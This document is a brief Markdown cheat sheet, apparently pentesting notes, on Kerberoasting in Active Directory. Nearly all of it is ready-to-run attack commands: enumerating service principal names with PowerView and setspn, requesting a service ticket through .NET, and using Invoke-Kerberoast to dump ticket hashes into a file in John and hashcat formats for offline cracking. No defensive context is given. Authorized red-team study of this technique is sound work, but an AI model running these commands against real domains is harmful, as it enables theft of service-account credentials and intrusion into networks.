# Kerberoast

## Find SPN

### Powerview

```text
. .\powerview.ps1
Get-NetUser -SPN
```

### Powershell

```text
setspn -T domain -Q */*
```

## Request a TGS

### Powershell

```text
Add-Type -AssemblyName system.identitymodel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/lab.domain.local"
```

### Invoke-Kerberoast

```text
 Invoke-Kerberoast -OutputFormat John  -ErrorAction SilentlyContinue | ft -HideTableHeaders -AutoSize Hash | Out-File -Width 5000 -Encoding "UTF8" .\roast.txt
 Invoke-Kerberoast -OutputFormat hashcat  -ErrorAction SilentlyContinue | ft -HideTableHeaders -AutoSize Hash | Out-File -Width 5000 -Encoding "UTF8" .\roast.txt
```



